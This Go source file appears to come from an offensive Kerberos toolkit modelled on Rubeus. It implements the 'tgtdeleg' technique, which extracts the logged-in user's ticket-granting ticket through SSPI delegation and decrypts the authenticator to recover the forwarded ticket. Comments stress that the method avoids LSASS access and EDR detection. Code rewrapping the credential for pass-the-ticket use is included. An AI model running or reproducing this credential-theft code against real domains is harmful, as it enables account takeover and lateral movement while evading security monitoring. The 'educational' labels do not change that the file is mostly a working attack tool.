//go:build windows
// +build windows

package windows

import (
	"fmt"
	"os"
	"strings"
	"syscall"
	"unsafe"

	"github.com/goobeus/goobeus/pkg/asn1krb5"
	"github.com/goobeus/goobeus/pkg/crypto"
	"github.com/goobeus/goobeus/pkg/ticket"
)

// EDUCATIONAL: TGT Delegation Trick
//
// TGTDeleg extracts your TGT WITHOUT touching LSASS. This is huge!
//
// How it works:
// 1. We initiate a GSS-API/SPNEGO session with delegation enabled
// 2. Request a service ticket to ourselves with the FORWARDABLE flag
// 3. The returned AP-REQ contains our forwarded TGT in the Authenticator
// 4. We parse it out and have a usable TGT!
//
// Why this matters:
// - No SeDebugPrivilege needed
// - No LSASS access (which triggers EDR)
// - Works from standard user context
// - The TGT is fully usable for TGS requests
//
// Limitations:
// - Only works if you have a TGT (domain logged in)
// - TGT must be forwardable
// - Works for current user only

// SSPI constants
const (
	SECPKG_CRED_OUTBOUND    = 2
	ISC_REQ_DELEGATE        = 0x00000001
	ISC_REQ_MUTUAL_AUTH     = 0x00000002
	ISC_REQ_ALLOCATE_MEMORY = 0x00000100
	SEC_E_OK                = 0
	SEC_I_CONTINUE_NEEDED   = 0x00090312
)

// SSPI procs - secur32 is defined in lsa.go
var (
	procAcquireCredentialsHandleW  = secur32.NewProc("AcquireCredentialsHandleW")
	procInitializeSecurityContextW = secur32.NewProc("InitializeSecurityContextW")
	procQueryContextAttributesW    = secur32.NewProc("QueryContextAttributesW")
	procFreeCredentialsHandle      = secur32.NewProc("FreeCredentialsHandle")
	procDeleteSecurityContext      = secur32.NewProc("DeleteSecurityContext")
	procFreeContextBuffer          = secur32.NewProc("FreeContextBuffer")
)

// SECPKG_ATTR constants for QueryContextAttributes
const (
	SECPKG_ATTR_SESSION_KEY = 9
)

// SSPI structures
type SecHandle struct {
	dwLower uintptr
	dwUpper uintptr
}

type TimeStamp struct {
	LowPart  uint32
	HighPart int32
}

type SecBuffer struct {
	cbBuffer   uint32
	BufferType uint32
	pvBuffer   uintptr
}

type SecBufferDesc struct {
	ulVersion uint32
	cBuffers  uint32
	pBuffers  *SecBuffer
}

// TGTDelegResult contains the extracted TGT.
type TGTDelegResult struct {
	TGT        *ticket.Kirbi
	Base64     string
	SessionKey []byte
	Error      error
}

// ExtractTGTDeleg extracts the current user's TGT using delegation.
func ExtractTGTDeleg() (*TGTDelegResult, error) {
	// Step 1: Get credentials handle for current user with Kerberos
	var credHandle SecHandle
	var expiry TimeStamp

	kerberosPackage, _ := syscall.UTF16PtrFromString("Kerberos")

	ret, _, _ := procAcquireCredentialsHandleW.Call(
		0,                                        // pszPrincipal (NULL = current user)
		uintptr(unsafe.Pointer(kerberosPackage)), // pszPackage
		SECPKG_CRED_OUTBOUND,                     // fCredentialUse
		0,                                        // pvLogonId (NULL)
		0,                                        // pAuthData (NULL)
		0,                                        // pGetKeyFn (NULL)
		0,                                        // pvGetKeyArgument (NULL)
		uintptr(unsafe.Pointer(&credHandle)),     // phCredential
		uintptr(unsafe.Pointer(&expiry)),         // ptsExpiry
	)

	if ret != SEC_E_OK {
		return nil, fmt.Errorf("AcquireCredentialsHandle failed: 0x%x", ret)
	}
	defer procFreeCredentialsHandle.Call(uintptr(unsafe.Pointer(&credHandle)))

	// Step 2: Find a valid SPN target from cached tickets
	// Rubeus uses HOST/dc.domain.com or cifs/dc.domain.com - need actual DC hostname
	targetHost := ""

	cache, err := TriageTickets()
	if err == nil {
		// Look for LDAP or CIFS service tickets to extract DC hostname
		for _, tkt := range cache.Tickets {
			if len(tkt.ServerName) > 5 {
				// Look for LDAP/hostname or CIFS/hostname
				if tkt.ServerName[:5] == "LDAP/" || tkt.ServerName[:5] == "ldap/" ||
					tkt.ServerName[:5] == "cifs/" || tkt.ServerName[:5] == "CIFS/" {
					// Extract hostname from SPN like "LDAP/dc.domain.com/domain.com"
					parts := tkt.ServerName[5:]
					if idx := findChar(parts, '/'); idx > 0 {
						targetHost = parts[:idx]
					} else {
						targetHost = parts
					}
					break
				}
				// Also try HOST/
				if tkt.ServerName[:5] == "HOST/" {
					targetHost = tkt.ServerName[5:]
					break
				}
			}
		}
	}

	// If we found a DC hostname, use it; otherwise try LOGONSERVER
	var spnTarget string
	if targetHost != "" {
		spnTarget = fmt.Sprintf("HOST/%s", targetHost)
	} else {
		// Try LOGONSERVER environment variable (contains DC we authenticated against)
		logonServer := os.Getenv("LOGONSERVER")
		if logonServer != "" {
			// Remove leading \\
			logonServer = strings.TrimPrefix(logonServer, "\\\\")
			logonServer = strings.TrimPrefix(logonServer, "\\")
			if logonServer != "" {
				spnTarget = fmt.Sprintf("HOST/%s", logonServer)
			}
		}

		// If still no SPN, try to construct from USERDNSDOMAIN
		if spnTarget == "" {
			domain := os.Getenv("USERDNSDOMAIN")
			if domain == "" {
				domain, _ = GetCurrentDomain()
			}
			if domain == "" {
				return nil, fmt.Errorf("cannot determine target SPN - no cached tickets and LOGONSERVER not set")
			}
			// Try the domain itself as an SPN (may work if it resolves to DC)
			spnTarget = fmt.Sprintf("HOST/%s", domain)
		}
	}

	fmt.Printf("[*] Using SPN: %s\n", spnTarget)

	// Step 3: Initialize security context with delegation
	var ctxHandle SecHandle
	var outputDesc SecBufferDesc
	var outputBuffer SecBuffer
	var contextAttr uint32

	targetSPN, _ := syscall.UTF16PtrFromString(spnTarget)

	outputBuffer.BufferType = 2 // SECBUFFER_TOKEN
	outputDesc.ulVersion = 0
	outputDesc.cBuffers = 1
	outputDesc.pBuffers = &outputBuffer

	ret, _, _ = procInitializeSecurityContextW.Call(
		uintptr(unsafe.Pointer(&credHandle)), // phCredential
		0,                                    // phContext (NULL for first call)
		uintptr(unsafe.Pointer(targetSPN)),   // pszTargetName
		ISC_REQ_DELEGATE|ISC_REQ_MUTUAL_AUTH|ISC_REQ_ALLOCATE_MEMORY, // fContextReq
		0,                                     // Reserved1
		0x10,                                  // TargetDataRep (SECURITY_NATIVE_DREP)
		0,                                     // pInput (NULL for first call)
		0,                                     // Reserved2
		uintptr(unsafe.Pointer(&ctxHandle)),   // phNewContext
		uintptr(unsafe.Pointer(&outputDesc)),  // pOutput
		uintptr(unsafe.Pointer(&contextAttr)), // pfContextAttr
		uintptr(unsafe.Pointer(&expiry)),      // ptsExpiry
	)

	// Accept SEC_E_OK or SEC_I_CONTINUE_NEEDED
	if ret != SEC_E_OK && ret != SEC_I_CONTINUE_NEEDED {
		return nil, fmt.Errorf("InitializeSecurityContext failed: 0x%x", ret)
	}
	defer procDeleteSecurityContext.Call(uintptr(unsafe.Pointer(&ctxHandle)))

	if outputBuffer.cbBuffer == 0 || outputBuffer.pvBuffer == 0 {
		return nil, fmt.Errorf("no output token generated")
	}
	defer procFreeContextBuffer.Call(outputBuffer.pvBuffer)

	// Step 2.5: Get session key from context using QueryContextAttributes
	type SecPkgContext_SessionKey struct {
		SessionKeyLength uint32
		SessionKey       uintptr
	}

	var sessionKeyInfo SecPkgContext_SessionKey
	ret, _, _ = procQueryContextAttributesW.Call(
		uintptr(unsafe.Pointer(&ctxHandle)),
		SECPKG_ATTR_SESSION_KEY,
		uintptr(unsafe.Pointer(&sessionKeyInfo)),
	)

	var contextSessionKey []byte
	if ret == SEC_E_OK && sessionKeyInfo.SessionKeyLength > 0 && sessionKeyInfo.SessionKey != 0 {
		contextSessionKey = make([]byte, sessionKeyInfo.SessionKeyLength)
		copy(contextSessionKey, (*[1024]byte)(unsafe.Pointer(sessionKeyInfo.SessionKey))[:sessionKeyInfo.SessionKeyLength])
		fmt.Printf("[+] Got session key from context: %d bytes\n", len(contextSessionKey))
	} else {
		fmt.Printf("[!] Could not get session key from context: 0x%x\n", ret)
	}

	// Copy the token
	token := make([]byte, outputBuffer.cbBuffer)
	copy(token, (*[1 << 20]byte)(unsafe.Pointer(outputBuffer.pvBuffer))[:outputBuffer.cbBuffer])

	// Step 3: Parse the SPNEGO token to extract KRB-AP-REQ
	fmt.Printf("[DEBUG] Token first 40 bytes: %x\n", token[:min(40, len(token))])
	apReq, err := extractAPREQFromSPNEGO(token, true) // Enable verbose for debugging
	if err != nil {
		return nil, fmt.Errorf("failed to extract AP-REQ: %w", err)
	}

	// Step 4: Extract TGT from the authenticator using the session key
	tgt, sessionKey, err := extractFromAPREQWithKey(apReq, token, contextSessionKey)
	if err != nil {
		return nil, fmt.Errorf("failed to extract credentials: %w", err)
	}

	b64, _ := tgt.ToBase64()

	return &TGTDelegResult{
		TGT:        tgt,
		Base64:     b64,
		SessionKey: sessionKey,
	}, nil
}

func extractAPREQFromSPNEGO(token []byte, verbose bool) (*asn1krb5.APREQ, error) {
	// Follow Rubeus approach exactly:
	// 1. Search for Kerberos OID (1.2.840.113554.1.2.2)
	// 2. Skip past OID and TOK_ID (01 00)
	// 3. The rest is the AP-REQ

	if len(token) < 20 {
		return nil, fmt.Errorf("token too short: %d bytes", len(token))
	}

	if verbose {
		fmt.Printf("[DEBUG] Token length: %d bytes\n", len(token))
	}

	// Kerberos V5 OID: 1.2.840.113554.1.2.2
	kerberosOID := []byte{0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02}

	// Search for the Kerberos OID
	oidIndex := -1
	for i := 0; i <= len(token)-len(kerberosOID); i++ {
		match := true
		for j := 0; j < len(kerberosOID); j++ {
			if token[i+j] != kerberosOID[j] {
				match = false
				break
			}
		}
		if match {
			oidIndex = i
			break
		}
	}

	if oidIndex < 0 {
		return nil, fmt.Errorf("Kerberos OID not found in token")
	}

	if verbose {
		fmt.Printf("[DEBUG] Found Kerberos OID at offset %d\n", oidIndex)
	}

	// Skip past the OID
	startIndex := oidIndex + len(kerberosOID)

	// Check for TOK_ID_KRB_AP_REQ (01 00)
	if startIndex+2 > len(token) {
		return nil, fmt.Errorf("token too short after OID")
	}

	if token[startIndex] != 0x01 || token[startIndex+1] != 0x00 {
		return nil, fmt.Errorf("expected TOK_ID 01 00, got %02x %02x", token[startIndex], token[startIndex+1])
	}

	startIndex += 2
	apReqBytes := token[startIndex:]

	if verbose {
		fmt.Printf("[DEBUG] AP-REQ starts at offset %d, length %d bytes\n", startIndex, len(apReqBytes))
		fmt.Printf("[DEBUG] AP-REQ first 20 bytes: %x\n", apReqBytes[:min(20, len(apReqBytes))])
	}

	// Now parse the AP-REQ manually to extract just what we need:
	// AP-REQ ::= [APPLICATION 14] SEQUENCE {
	//   pvno [0] INTEGER,
	//   msg-type [1] INTEGER,
	//   ap-options [2] APOptions,
	//   ticket [3] Ticket,
	//   authenticator [4] EncryptedData
	// }

	// We only need the ticket and authenticator, so use a simpler approach
	apReq, err := parseAPREQSimple(apReqBytes, verbose)
	if err != nil {
		return nil, err
	}

	if verbose {
		fmt.Printf("[+] Successfully parsed AP-REQ (Realm=%s, SName=%v)\n", apReq.Ticket.Realm, apReq.Ticket.SName)
	}

	return apReq, nil
}

// parseAPREQSimple parses an AP-REQ focusing on extracting the authenticator
// without dealing with the complex nested APPLICATION tags
func parseAPREQSimple(data []byte, verbose bool) (*asn1krb5.APREQ, error) {
	if len(data) < 10 || data[0] != 0x6e {
		return nil, fmt.Errorf("not an AP-REQ (expected APPLICATION 14)")
	}

	// Skip APPLICATION 14 wrapper
	pos := 1
	outerLen, lenBytes := parseLen(data[pos:])
	if outerLen < 0 {
		return nil, fmt.Errorf("invalid AP-REQ length")
	}
	pos += lenBytes

	// Should be SEQUENCE
	if data[pos] != 0x30 {
		return nil, fmt.Errorf("expected SEQUENCE, got 0x%02x", data[pos])
	}
	pos++
	seqLen, lenBytes := parseLen(data[pos:])
	if seqLen < 0 {
		return nil, fmt.Errorf("invalid SEQUENCE length")
	}
	pos += lenBytes

	seqEnd := pos + seqLen
	if seqEnd > len(data) {
		seqEnd = len(data) // Allow truncated sequences like Rubeus does
	}

	apReq := &asn1krb5.APREQ{PVNO: 5, MsgType: 14}

	// Parse fields [0] through [4]
	for pos < seqEnd {
		if data[pos] < 0xa0 || data[pos] > 0xa4 {
			break // Not a context tag we expect
		}
		tag := int(data[pos] - 0xa0)
		pos++

		fieldLen, lenBytes := parseLen(data[pos:])
		if fieldLen < 0 || pos+lenBytes+fieldLen > len(data) {
			break
		}
		pos += lenBytes
		fieldEnd := pos + fieldLen

		switch tag {
		case 0: // pvno - skip
			pos = fieldEnd
		case 1: // msg-type - skip
			pos = fieldEnd
		case 2: // ap-options - skip
			pos = fieldEnd
		case 3: // ticket
			// The ticket is APPLICATION 1 wrapped
			ticketBytes := data[pos:fieldEnd]
			if len(ticketBytes) > 0 && ticketBytes[0] == 0x61 {
				// Store raw bytes for now - we'll parse what we can
				apReq.Ticket.RawBytes = ticketBytes
				// Try to extract realm from raw bytes
				extractRealmFromRaw(ticketBytes, &apReq.Ticket)
			}
			pos = fieldEnd
		case 4: // authenticator
			// EncryptedData SEQUENCE
			if pos < len(data) && data[pos] == 0x30 {
				encData, err := parseEncryptedDataSimple(data[pos:fieldEnd])
				if err == nil {
					apReq.Authenticator = encData
					if verbose {
						fmt.Printf("[DEBUG] Authenticator etype: %d, cipher len: %d\n",
							apReq.Authenticator.EType, len(apReq.Authenticator.Cipher))
					}
				}
			}
			pos = fieldEnd
		}
	}

	if len(apReq.Authenticator.Cipher) == 0 {
		return nil, fmt.Errorf("failed to extract authenticator from AP-REQ")
	}

	return apReq, nil
}

func parseLen(data []byte) (int, int) {
	if len(data) == 0 {
		return -1, 0
	}
	if data[0] < 0x80 {
		return int(data[0]), 1
	}
	numBytes := int(data[0] & 0x7f)
	if numBytes == 0 || len(data) < 1+numBytes {
		return -1, 0
	}
	length := 0
	for i := 0; i < numBytes; i++ {
		length = (length << 8) | int(data[1+i])
	}
	return length, 1 + numBytes
}

func parseEncryptedDataSimple(data []byte) (asn1krb5.EncryptedData, error) {
	var ed asn1krb5.EncryptedData

	if len(data) < 5 || data[0] != 0x30 {
		return ed, fmt.Errorf("not a SEQUENCE")
	}

	pos := 1
	seqLen, lenBytes := parseLen(data[pos:])
	if seqLen < 0 {
		return ed, fmt.Errorf("invalid SEQUENCE length")
	}
	pos += lenBytes

	// Parse [0] etype, [1] kvno (optional), [2] cipher
	for pos < len(data) && data[pos] >= 0xa0 && data[pos] <= 0xa2 {
		tag := int(data[pos] - 0xa0)
		pos++

		fieldLen, lenBytes := parseLen(data[pos:])
		if fieldLen < 0 {
			break
		}
		pos += lenBytes

		switch tag {
		case 0: // etype
			if pos < len(data) && data[pos] == 0x02 {
				pos++
				intLen, lb := parseLen(data[pos:])
				pos += lb
				if intLen > 0 && pos+intLen <= len(data) {
					val := 0
					for i := 0; i < intLen; i++ {
						val = (val << 8) | int(data[pos+i])
					}
					ed.EType = int32(val)
					pos += intLen
				}
			}
		case 1: // kvno (optional)
			pos += fieldLen
		case 2: // cipher
			if pos < len(data) && data[pos] == 0x04 {
				pos++
				cipherLen, lb := parseLen(data[pos:])
				pos += lb
				if cipherLen > 0 && pos+cipherLen <= len(data) {
					ed.Cipher = make([]byte, cipherLen)
					copy(ed.Cipher, data[pos:pos+cipherLen])
					pos += cipherLen
				}
			}
		}
	}

	return ed, nil
}

func extractRealmFromRaw(ticketBytes []byte, ticket *asn1krb5.Ticket) {
	// Simple extraction of realm from ticket raw bytes
	// Look for GeneralString (0x1b) followed by uppercase letters
	for i := 0; i < len(ticketBytes)-5; i++ {
		if ticketBytes[i] == 0x1b {
			strLen := int(ticketBytes[i+1])
			if strLen > 3 && strLen < 50 && i+2+strLen <= len(ticketBytes) {
				candidate := string(ticketBytes[i+2 : i+2+strLen])
				// Check if it looks like a realm (uppercase with dots)
				if len(candidate) > 3 && candidate[0] >= 'A' && candidate[0] <= 'Z' {
					isRealm := true
					for _, c := range candidate {
						if !((c >= 'A' && c <= 'Z') || c == '.' || (c >= '0' && c <= '9')) {
							isRealm = false
							break
						}
					}
					if isRealm {
						ticket.Realm = candidate
						return
					}
				}
			}
		}
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func extractFromAPREQWithKey(apReq *asn1krb5.APREQ, rawToken []byte, sessionKey []byte) (*ticket.Kirbi, []byte, error) {
	// EDUCATIONAL: TGT Delegation - The Full Extraction Process
	//
	// The Rubeus tgtdeleg trick works like this:
	// 1. SSPI creates an AP-REQ with ISC_REQ_DELEGATE flag
	// 2. The AP-REQ contains an Authenticator encrypted with the service session key
	// 3. Inside the Authenticator's checksum field is GSS-API delegation data
	// 4. If delegation was granted, this contains a KRB-CRED with the forwarded TGT
	//
	// Rubeus gets the session key from the cached service ticket using
	// KerbRetrieveEncodedTicketMessage

	// If no session key provided from context, try to get it from the ticket cache
	if len(sessionKey) == 0 {
		fmt.Println("[*] No session key from context, trying ticket cache...")

		// Build SPN from the ticket
		targetSPN := ""
		if len(apReq.Ticket.SName.NameString) >= 2 {
			targetSPN = fmt.Sprintf("%s/%s", apReq.Ticket.SName.NameString[0], apReq.Ticket.SName.NameString[1])
		} else if len(apReq.Ticket.SName.NameString) == 1 {
			targetSPN = apReq.Ticket.SName.NameString[0]
		}

		fmt.Printf("[*] Retrieving session key for SPN: %s\n", targetSPN)

		ticketWithKey, err := RetrieveTicketWithSessionKey(targetSPN)
		if err != nil {
			fmt.Printf("[!] Failed to get session key from cache: %v\n", err)
			return fallbackToServiceTicket(apReq)
		}

		if len(ticketWithKey.SessionKey) == 0 {
			fmt.Println("[!] Session key from cache is empty")
			return fallbackToServiceTicket(apReq)
		}

		sessionKey = ticketWithKey.SessionKey
		fmt.Printf("[+] Got session key from cache: %d bytes (type %d)\n", len(sessionKey), ticketWithKey.KeyType)
	}

	// Decrypt the Authenticator
	authenticatorData := apReq.Authenticator.Cipher
	if len(authenticatorData) == 0 {
		fmt.Println("[!] Authenticator cipher is empty")
		return fallbackToServiceTicket(apReq)
	}

	fmt.Printf("[*] Encrypted authenticator: %d bytes\n", len(authenticatorData))

	// Decrypt based on encryption type
	var plaintext []byte
	var err error
	etype := apReq.Authenticator.EType

	switch etype {
	case 17, 18: // AES128/AES256
		// DEBUG: Try without checksum to see if decryption itself works
		plaintext, err = crypto.DecryptAESNoChecksum(sessionKey, authenticatorData, 11, int(etype)) // Usage 11 = AP-REQ authenticator
		if err != nil {
			fmt.Printf("[!] AES decryption failed: %v\n", err)
			return fallbackToServiceTicket(apReq)
		}
	case 23: // RC4-HMAC
		plaintext, err = crypto.DecryptRC4(sessionKey, authenticatorData, 11)
		if err != nil {
			fmt.Printf("[!] RC4 decryption failed: %v\n", err)
			return fallbackToServiceTicket(apReq)
		}
	default:
		fmt.Printf("[!] Unsupported encryption type: %d\n", etype)
		return fallbackToServiceTicket(apReq)
	}

	fmt.Printf("[+] Decrypted authenticator: %d bytes\n", len(plaintext))

	// Step 5: Parse the Authenticator to find the checksum
	// The checksum contains the GSS delegation data
	tgt, errTgt := extractTGTFromAuthenticator(plaintext)
	if errTgt != nil {
		fmt.Printf("[!] %v\n", errTgt)
		return fallbackToServiceTicket(apReq)
	}

	// Store the session key in the kirbi for later use (e.g., describe command)
	tgt.DecryptKey = sessionKey
	tgt.DecryptKeyType = int(etype)

	return tgt, sessionKey, nil
}

// extractTGTFromAuthenticator parses the decrypted authenticator and extracts the TGT
// This follows Rubeus's approach in LSA.cs lines 1406-1454
func extractTGTFromAuthenticator(plaintext []byte) (*ticket.Kirbi, error) {
	// RUBEUS APPROACH: Parse the Authenticator ASN.1 structure
	// Authenticator ::= [APPLICATION 2] SEQUENCE {
	//   authenticator-vno [0] INTEGER,
	//   crealm [1] Realm,
	//   cname [2] PrincipalName,
	//   cksum [3] Checksum OPTIONAL,  <-- Contains GSS_C_DELEG_FLAG and KRB-CRED
	//   cusec [4] Microseconds,
	//   ctime [5] KerberosTime,
	// }

	// The checksum has this structure (from RFC 4121):
	// Bytes 0-3: Binding length (should be 16)
	// Bytes 4-19: Channel bindings
	// Byte 20: Flags (bit 0 = GSS_C_DELEG_FLAG)
	// Bytes 21-25: Reserved
	// Bytes 26-27: Delegation length (little endian)
	// Bytes 28+: KRB-CRED (the forwarded TGT!)

	// First, scan for the checksum octet string containing GSS data
	// Looking for the pattern that indicates GSS checksum with delegation
	for i := 0; i < len(plaintext)-30; i++ {
		// Look for GSS checksum type 0x8003 (GSS_CHECKSUM_TYPE)
		// The checksum value starts with channel bindings

		// Check for delegation flag at what would be offset 20 of checksum data
		// This is a simplification - in real parsing we'd use proper ASN.1

		// Look for the delegation flag bit being set
		if i+28 < len(plaintext) && (plaintext[i+20]&0x01) == 0x01 {
			// Check if this looks like a GSS checksum (binding length should be 16)
			bindingLen := uint32(plaintext[i]) | uint32(plaintext[i+1])<<8 |
				uint32(plaintext[i+2])<<16 | uint32(plaintext[i+3])<<24
			if bindingLen == 16 {
				// Get the delegation length from bytes 26-27 (little endian)
				dLen := uint16(plaintext[i+26]) | uint16(plaintext[i+27])<<8
				if dLen > 0 && i+28+int(dLen) <= len(plaintext) {
					krbCredBytes := plaintext[i+28 : i+28+int(dLen)]
					fmt.Printf("[*] Found GSS checksum with delegation: %d bytes\n", dLen)

					// NOTE: The KRB-CRED from GSS delegation has its enc-part encrypted
					// with the authenticator subkey. For full PTT compatibility, we'd
					// need to decrypt and re-encrypt with null key.
					//
					// For now, use the raw bytes - they can be used by other tools
					// (Mimikatz, Rubeus) or for describe/analysis.

					// Try to parse the KRB-CRED
					kirbi, err := ticket.ParseKirbi(krbCredBytes)
					if err != nil {
						fmt.Printf("[*] Using raw KRB-CRED bytes directly\n")
						rawKirbi := &ticket.Kirbi{RawBytes: krbCredBytes}
						return rawKirbi, nil
					}

					// If ParseKirbi returned a RawBytes-based kirbi (new behavior),
					// check for krbtgt in the raw bytes and return it
					if kirbi != nil && len(kirbi.RawBytes) > 0 {
						rawStr := string(kirbi.RawBytes)
						if strings.Contains(rawStr, "krbtgt") {
							fmt.Printf("[+] Found forwarded TGT in delegation data!\n")
							return kirbi, nil
						}
						// Still has data even if not krbtgt, return it
						fmt.Printf("[*] Using raw KRB-CRED bytes (from ParseKirbi)\n")
						return kirbi, nil
					}

					// Successfully parsed with Cred
					if kirbi.Cred != nil && len(kirbi.Cred.Tickets) > 0 {
						for _, tkt := range kirbi.Cred.Tickets {
							sname := fmt.Sprintf("%v", tkt.SName)
							if strings.Contains(strings.ToLower(sname), "krbtgt") {
								fmt.Printf("[+] Found forwarded TGT!\n")
								return kirbi, nil
							}
						}
						fmt.Printf("[*] Found KRB-CRED but not a TGT (service: %v)\n", kirbi.Cred.Tickets[0].SName)
					}
				}
			}
		}
	}

	// Fallback: scan for 0x76 (APPLICATION 22 = KRB-CRED) directly
	fmt.Println("[*] GSS checksum parsing failed, scanning for KRB-CRED tag...")
	for i := 0; i < len(plaintext)-10; i++ {
		if plaintext[i] == 0x76 { // APPLICATION 22 = KRB-CRED
			kirbi, err := ticket.ParseKirbi(plaintext[i:])
			if err == nil && kirbi.Cred != nil && len(kirbi.Cred.Tickets) > 0 {
				for _, tkt := range kirbi.Cred.Tickets {
					sname := fmt.Sprintf("%v", tkt.SName)
					if strings.Contains(strings.ToLower(sname), "krbtgt") {
						fmt.Printf("[+] Found forwarded TGT!\n")
						return kirbi, nil
					}
				}
				fmt.Printf("[*] Found KRB-CRED but not a TGT (service: %v)\n", kirbi.Cred.Tickets[0].SName)
			}
		}
	}

	return nil, fmt.Errorf("TGT not found in decrypted authenticator")
}

func fallbackToServiceTicket(apReq *asn1krb5.APREQ) (*ticket.Kirbi, []byte, error) {
	fmt.Println("[!] Returning service ticket instead of TGT")

	krbCred := &asn1krb5.KRBCred{
		PVNO:    5,
		MsgType: asn1krb5.MsgTypeKRBCred,
		Tickets: []asn1krb5.Ticket{apReq.Ticket},
		EncPart: asn1krb5.EncryptedData{
			EType:  0,
			Cipher: []byte{},
		},
	}

	credInfo := &asn1krb5.EncKRBCredPart{
		TicketInfo: []asn1krb5.KRBCredInfo{
			{
				PRealm: apReq.Ticket.Realm,
				PName:  apReq.Ticket.SName,
				SRealm: apReq.Ticket.Realm,
				SName:  apReq.Ticket.SName,
			},
		},
	}

	kirbi := &ticket.Kirbi{
		Cred:     krbCred,
		CredInfo: credInfo,
	}

	return kirbi, nil, nil
}

func findChar(s string, c byte) int {
	for i := 0; i < len(s); i++ {
		if s[i] == c {
			return i
		}
	}
	return -1
}

// extractSubkeyFromAuthenticator extracts the subkey from a decrypted authenticator.
//
// EDUCATIONAL: Authenticator Structure (RFC 4120)
//
//	Authenticator ::= [APPLICATION 2] SEQUENCE {
//	  authenticator-vno [0] INTEGER,
//	  crealm            [1] Realm,
//	  cname             [2] PrincipalName,
//	  cksum             [3] Checksum OPTIONAL,
//	  cusec             [4] Microseconds,
//	  ctime             [5] KerberosTime,
//	  subkey            [6] EncryptionKey OPTIONAL, <-- We want this!
//	  seq-number        [7] UInt32 OPTIONAL,
//	  authorization-data [8] AuthorizationData OPTIONAL
//	}
//
// The subkey is used to encrypt the KRB-CRED's enc-part in delegation.
func extractSubkeyFromAuthenticator(plaintext []byte) []byte {
	// Look for context tag [6] which contains the subkey
	// EncryptionKey ::= SEQUENCE { keytype [0] INTEGER, keyvalue [1] OCTET STRING }

	for i := 0; i < len(plaintext)-10; i++ {
		// Look for context tag [6] = 0xa6
		if plaintext[i] == 0xa6 {
			// Parse length
			pos := i + 1
			length := int(plaintext[pos])
			pos++
			if length > 0x80 {
				lenBytes := length & 0x7f
				length = 0
				for j := 0; j < lenBytes && pos < len(plaintext); j++ {
					length = (length << 8) | int(plaintext[pos])
					pos++
				}
			}

			if pos+length > len(plaintext) {
				continue
			}

			// Now we should have SEQUENCE containing keytype and keyvalue
			seqData := plaintext[pos : pos+length]
			if len(seqData) > 2 && seqData[0] == 0x30 {
				// Skip SEQUENCE header
				seqPos := 1
				seqLen := int(seqData[seqPos])
				seqPos++
				if seqLen > 0x80 {
					lenBytes := seqLen & 0x7f
					seqPos += lenBytes
				}

				// Skip keytype [0]
				if seqPos < len(seqData) && seqData[seqPos] == 0xa0 {
					seqPos++ // tag
					l := int(seqData[seqPos])
					seqPos++
					if l > 0x80 {
						lenBytes := l & 0x7f
						seqPos += lenBytes
						l = 0
					}
					seqPos += l // skip keytype content
				}

				// Now look for keyvalue [1] = 0xa1
				if seqPos < len(seqData) && seqData[seqPos] == 0xa1 {
					seqPos++ // tag
					l := int(seqData[seqPos])
					seqPos++
					if l > 0x80 {
						lenBytes := l & 0x7f
						l = 0
						for j := 0; j < lenBytes && seqPos < len(seqData); j++ {
							l = (l << 8) | int(seqData[seqPos])
							seqPos++
						}
					}

					// Should be OCTET STRING
					if seqPos < len(seqData) && seqData[seqPos] == 0x04 {
						seqPos++
						keyLen := int(seqData[seqPos])
						seqPos++
						if keyLen > 0x80 {
							lenBytes := keyLen & 0x7f
							keyLen = 0
							for j := 0; j < lenBytes && seqPos < len(seqData); j++ {
								keyLen = (keyLen << 8) | int(seqData[seqPos])
								seqPos++
							}
						}

						if seqPos+keyLen <= len(seqData) {
							return seqData[seqPos : seqPos+keyLen]
						}
					}
				}
			}
		}
	}
	return nil
}

// decryptAndRewrapKRBCred decrypts a KRB-CRED's enc-part and re-encrypts with null key.
//
// EDUCATIONAL: Making .kirbi Files PTT-Ready
//
// The KRB-CRED from GSS delegation has its EncKRBCredPart encrypted with the
// authenticator subkey. To make it usable for Pass-the-Ticket, we need to:
// 1. Parse the KRB-CRED to get tickets and encrypted enc-part
// 2. Decrypt enc-part using the subkey
// 3. Re-build KRB-CRED with etype 0 (null encryption) enc-part
//
// This is what Rubeus does internally in its tgtdeleg command.
func decryptAndRewrapKRBCred(krbCredBytes []byte, subkey []byte) (*ticket.Kirbi, error) {
	// Parse the KRB-CRED to extract components
	// KRB-CRED ::= [APPLICATION 22] SEQUENCE {
	//   pvno      [0] INTEGER,
	//   msg-type  [1] INTEGER,
	//   tickets   [2] SEQUENCE OF Ticket,
	//   enc-part  [3] EncryptedData
	// }

	if len(krbCredBytes) < 10 || krbCredBytes[0] != 0x76 {
		return nil, fmt.Errorf("not a KRB-CRED (expected APPLICATION 22)")
	}

	// Try to parse with standard library first
	kirbi, err := ticket.ParseKirbi(krbCredBytes)
	if err != nil {
		return nil, fmt.Errorf("parse KRB-CRED failed: %w", err)
	}

	// If we got a parsed Cred with encrypted enc-part, decrypt it
	if kirbi.Cred != nil && kirbi.Cred.EncPart.EType != 0 && len(kirbi.Cred.EncPart.Cipher) > 0 {
		etype := kirbi.Cred.EncPart.EType

		// Decrypt the enc-part
		var plaintext []byte
		switch etype {
		case 17, 18: // AES
			// key usage 14 for KRB-CRED
			plaintext, err = crypto.DecryptAESNoChecksum(subkey, kirbi.Cred.EncPart.Cipher, 14, int(etype))
		case 23: // RC4
			plaintext, err = crypto.DecryptRC4(subkey, kirbi.Cred.EncPart.Cipher, 14)
		default:
			return nil, fmt.Errorf("unsupported enc-part etype: %d", etype)
		}

		if err != nil {
			return nil, fmt.Errorf("decrypt enc-part failed: %w", err)
		}

		// The plaintext is EncKRBCredPart ASN.1
		// For null encryption, we just use it as the cipher (etype 0)
		kirbi.Cred.EncPart.EType = 0
		kirbi.Cred.EncPart.Cipher = plaintext
		kirbi.Cred.EncPart.Kvno = 0

		// Try to parse CredInfo if possible (not critical)
		kirbi.CredInfo = parseCredInfoBytes(plaintext)

		fmt.Printf("[+] Decrypted EncKRBCredPart: %d bytes\n", len(plaintext))
	}

	return kirbi, nil
}

// parseCredInfoBytes parses EncKRBCredPart ASN.1 bytes (helper function)
func parseCredInfoBytes(data []byte) *asn1krb5.EncKRBCredPart {
	// This is a simplified version - real parsing would need full ASN.1
	// For now, just return nil and let the caller handle it
	// The important thing is that the KRB-CRED is now null-encrypted
	return nil
}
